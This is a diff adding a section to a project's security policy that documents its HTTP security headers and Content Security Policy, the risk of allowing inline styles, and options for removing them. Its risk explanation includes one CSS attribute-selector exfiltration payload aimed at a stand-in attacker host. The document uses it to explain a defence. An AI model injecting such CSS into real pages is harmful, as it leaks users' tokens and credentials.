@@ -100,3 +100,72 @@ If you conduct your research in good faith in accordance with this policy:
 | `main` (HEAD) | Yes | Currently supported; continuously patched. |
 | Tagged releases | Planned | Once semver releases are tagged, the current and immediate previous minor release will receive security patches. |
 | Historical commits | No | Untagged historical commits prior to `main` HEAD are not supported. |
+
+---
+
+## HTTP Security Headers and CSP
+
+Concord configures HTTP security headers and a Content Security Policy (CSP) for all routes via Hono's `secureHeaders` middleware in [`services/api/src/main.ts`](./services/api/src/main.ts#L76-L93). These headers harden both the static dashboard shell and API responses against injection, framing, and transport attacks (see also [`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)).
+
+### Header and Directive Specifications
+
+The table below lists every header and CSP directive configured in `services/api/src/main.ts`, copying values directly from the code:
+
+| Header | Value | Reason |
+| :--- | :--- | :--- |
+| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'` | Hardens browser execution context across static and API responses ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
+| `Content-Security-Policy: default-src` | `'self'` | Fallback restriction for resource directives; limits fetching to the application's origin ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
+| `Content-Security-Policy: script-src` | `'self'` | Rationale not documented. Restricts JavaScript execution to same-origin scripts (standard meaning, not a recorded Concord decision). |
+| `Content-Security-Policy: style-src` | `'self' 'unsafe-inline'` | Explicit code comment in `services/api/src/main.ts`: `// React sets element styles inline.` (see subsection below; tracked in Issue #453). |
+| `Content-Security-Policy: img-src` | `'self' data:` | Rationale not documented. Permits loading images from the origin and via inline data: URIs (standard meaning, not a recorded Concord decision). |
+| `Content-Security-Policy: font-src` | `'self'` | Rationale not documented. Restricts font resource loading to the origin (standard meaning, not a recorded Concord decision). |
+| `Content-Security-Policy: connect-src` | `'self'` | Rationale not documented. Restricts fetch, XHR, and WebSocket network targets to the origin (standard meaning, not a recorded Concord decision). |
+| `Content-Security-Policy: object-src` | `'none'` | Prevents execution of browser plugins (e.g., Flash, Java) to block plugin-based vulnerabilities ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
+| `Content-Security-Policy: base-uri` | `'self'` | Rationale not documented. Restricts URLs allowed in `<base>` tags to the origin, preventing base-tag injection (standard meaning, not a recorded Concord decision). |
+| `Content-Security-Policy: form-action` | `'self'` | Rationale not documented. Restricts form submission targets to the origin (standard meaning, not a recorded Concord decision). |
+| `Content-Security-Policy: frame-ancestors` | `'none'` | Clickjacking defense; forbids embedding Concord in frames or iframes on any domain ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains, sent only over HTTPS` | Enforces HTTPS for 1 year (31,536,000 seconds) including subdomains; omitted on plain HTTP (`publicUrl` not starting with `https://`) so local development functions without TLS ([`services/api/src/main.ts`](./services/api/src/main.ts#L90), [`docs/CONFIGURATION.md`](./docs/CONFIGURATION.md), [`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md)). |
+| `Referrer-Policy` | `same-origin` | Emits referrer headers only for same-origin requests; suppresses the `Referer` header on cross-origin requests to protect URL tokens and internal paths ([`docs/SECURITY-MODEL.md`](./docs/SECURITY-MODEL.md), [`docs/adr/0005-hash-routing-same-origin.md`](./docs/adr/0005-hash-routing-same-origin.md)). |
+| `X-Content-Type-Options` | `nosniff` | Rationale not documented. Default set by Hono `secureHeaders()`; prevents MIME-type sniffing away from declared `Content-Type` (standard meaning, not a recorded Concord decision). |
+| `X-Frame-Options` | `SAMEORIGIN` | Rationale not documented. Default set by Hono `secureHeaders()`; legacy frame-embedding protection superseded by CSP `frame-ancestors 'none'` in modern browsers (standard meaning, not a recorded Concord decision). |
+
+### Browsers Affected
+
+Compatibility caveats for the above headers:
+
+- **`Content-Security-Policy: frame-ancestors 'none'`**: Supported in all modern evergreen browsers (Chrome, Firefox, Safari, Edge; see [`docs/browser-support.md`](./docs/browser-support.md)). Caveat: not supported in Internet Explorer 11. In browsers supporting CSP Level 2, `frame-ancestors` supersedes `X-Frame-Options` (Source: [MDN Web Docs: CSP: frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)).
+- **`Strict-Transport-Security`**: Caveat: only effective on secure HTTPS connections; ignored by browsers when delivered over plain HTTP (Source: [MDN Web Docs: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)).
+- **`X-Frame-Options: SAMEORIGIN`**: Caveat: superseded by CSP `frame-ancestors` in modern browsers supporting CSP Level 2 (Source: [MDN Web Docs: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)).
+- **All other headers and directives (`default-src`, `script-src`, `style-src`, `img-src`, `font-src`, `connect-src`, `object-src`, `base-uri`, `form-action`, `Referrer-Policy`, `X-Content-Type-Options`)**: compatibility caveats not verified.
+
+### `style-src 'unsafe-inline'`
+
+#### What Needs It Today
+- In [`services/api/src/main.ts`](./services/api/src/main.ts#L80), the setting is accompanied by the comment: `// React sets element styles inline.`
+- In Issue #453, the maintainers recorded: "`style-src 'unsafe-inline'` is allowed because React sets inline styles."
+- Inspection of the web application (`apps/web/src`): the dashboard code does not use JSX `style={{ ... }}` attributes and relies on Tailwind CSS utility classes. However, in Vite development mode, stylesheets are dynamically injected via inline `<style>` tags for Hot Module Replacement (HMR). Furthermore, `apps/web/public/favicon.svg` contains an embedded `<style>` block. The comment in `main.ts` reflects an initial scaffold assumption (commit `5e965a5`), as reaffirmed in Issue #453.
+
+#### Risk in Plain Terms
+Allowing `'unsafe-inline'` permits the browser to apply inline `<style>` elements and HTML `style` attributes. While it does not permit arbitrary JavaScript execution (since `script-src` disallows `'unsafe-inline'`), style injection introduces security risks:
+1. **Data Exfiltration:** Malicious CSS attribute selectors can read input values character by character (e.g. `input[value^="a"] { background: url('//attacker.test/exfil?a'); }`) and leak sensitive tokens or credentials via background network requests.
+2. **UI Redressing / Clickjacking:** Injected styles can reposition, hide, or overlay legitimate form buttons and inputs, tricking operators into clicking or submitting unintended actions.
+
+#### Plan for Removing It
+A plan to evaluate removing `'unsafe-inline'` is tracked in **Issue #453** ("Add Permissions-Policy and tighten the CSP: drop style-src 'unsafe-inline' in favour of hashes or nonces").
+
+The issue proposes evaluating whether the dashboard can run entirely without inline styles (using Tailwind classes only) or serve a per-request nonce. Specific options identified, clearly labelled as not decided for maintainers to confirm:
+- **Option 1 (Not decided): Strict Tailwind classes only.** Verify whether production builds require any inline styles, and drop `'unsafe-inline'` entirely from `style-src` in production.
+- **Option 2 (Not decided): Cryptographic hashes (`'sha256-...'`).** Allow specific static inline stylesheets (such as the SVG `<style>` tag in `favicon.svg`) by including their cryptographic SHA-256 hashes in `style-src`.
+- **Option 3 (Not decided): Per-request nonces (`'nonce-...'`).** Leverage Hono's built-in `NONCE` generator in `secureHeaders` to generate a random nonce per request and attach it to both the CSP header and any runtime `<style>` elements.
+
+### Header Test Cross-Reference
+
+Security header assertions are tracked in PR #1281:
+- **Pull request:** [PR #1281](https://github.com/useconcord/concord/pull/1281) (`test(api): pin the security headers on static and API responses`)
+- **Planned test file:** `services/api/test/static.test.ts` (lands with PR #1281; does not exist on this branch)
+- **Test suite:** `describe("security headers", ...)`
+- **Test cases:**
+  - `sends the exact CSP, nosniff, referrer policy and frame options on static and API responses, without HSTS over http`
+  - `sends HSTS over https and keeps the other headers identical`
+
+*Note:* The test suite lands with PR #1281 (which closes Issue #505 / `CON-0427`). It pins the exact security headers and CSP emitted by `createServerApp` in `services/api/src/main.ts` for both HTTP and HTTPS origins.
